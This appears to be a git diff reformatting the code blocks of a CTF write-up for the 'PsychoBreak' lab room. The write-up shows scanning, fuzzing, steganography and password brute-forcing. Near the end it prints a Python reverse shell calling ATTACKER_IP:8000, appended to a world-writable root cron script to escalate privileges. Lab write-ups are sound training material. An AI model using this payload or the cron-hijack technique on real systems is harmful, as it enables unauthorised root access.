@@ -10,15 +10,11 @@ cryptography coming our way
 
 We'll start with our usual nmap scan
 
-```bash
-$ sudo nmap 10.10.242.66 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 60
-```
+    sudo nmap 10.10.242.66 -Pn -p- -A -vv -T4 -oN nmap-scan --script discovery,vuln --min-parallelism 60
 
 Select running services with this command:
 
-```bash
-$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
-```
+    cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
 
 [x] 21/tcp open  ftp     syn-ack ttl 63 ProFTPD 1.3.5a
 
@@ -89,9 +85,7 @@ We are presented with a comment:
 
 Fire up ffuf and search for directories:
 
-```bash
-$ ./ffuf -u http://10.10.155.224:80/SafeHeaven/FUZZ -ic -of html -o ~/CTF/PsychoBreak/ffuf-safe-heaven-report.html -w /home/shadowdealer/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 55
-```
+> `./ffuf -u http://10.10.155.224:80/SafeHeaven/FUZZ -ic -of html -o ~/CTF/PsychoBreak/ffuf-safe-heaven-report.html -w /home/shadowdealer/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 55`
 
 Results I got:
 
@@ -155,9 +149,7 @@ to translate audio to text. Playing the message a couple of times reveals the me
 
 For analysing emage we'll use steghide:
 
-```bash
-$ steghide --extract -sf Joseph_Oda.jpg
-```
+    steghide --extract -sf Joseph_Oda.jpg
 
 Enter the morse-code message and you'll be presented with a thankyou.txt, which contains
 FTP credentials.
@@ -174,13 +166,9 @@ Via FTP we can download 2 files:
 I wasn't able to to find which password does this program use with static analysis, so
 let's try bruteforcing:
 
-```bash
-$ strings random.dic > random.txt
-
-$ chmod +x program
-
-$ while read line; do ./program "$line"; done < random.txt
-```
+    strings random.dic > random.txt
+    chmod +x program
+    while read line; do ./program "$line"; done < random.txt
 
 And we now have a message to decode:
 
@@ -213,32 +201,26 @@ user.txt is right there, just `cat` it
 
 We'll start with a simple enumeration:
 
-```bash
-$ cat /etc/crontab
-```
+    cat /etc/crontab
 
 - */2 * * * * root python3 /var/.the_eye_of_ruvik.py
 
-```bash
-$ cd /var/
+Let's take a look at the file
 
-$ ls -la | grep eye
-
-```
+    cd /var/
+    ls -la | grep eye
 
 - -rwxr-xrw-  1 root root    300 Aug 14  2020 .the_eye_of_ruvik.py
 
 Ok, let's append python reverse shell there and wait for 2 minutes.
 
-```python
-import socket,os,pty;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("ATTACKER_IP",8000));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-pty.spawn("/bin/sh");
-```
+    import socket,os,pty;
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+    s.connect(("ATTACKER_IP",8000));
+    os.dup2(s.fileno(),0);
+    os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2);
+    pty.spawn("/bin/sh");
 
 That's it! Frankly, privilege escalation was the easiest part of this room.
 
@@ -246,6 +228,4 @@ That's it! Frankly, privilege escalation was the easiest part of this room.
 
 Just delete his account. In you root terminal:
 
-```bash
-$ userdel ruvik
-```
+    userdel ruvik
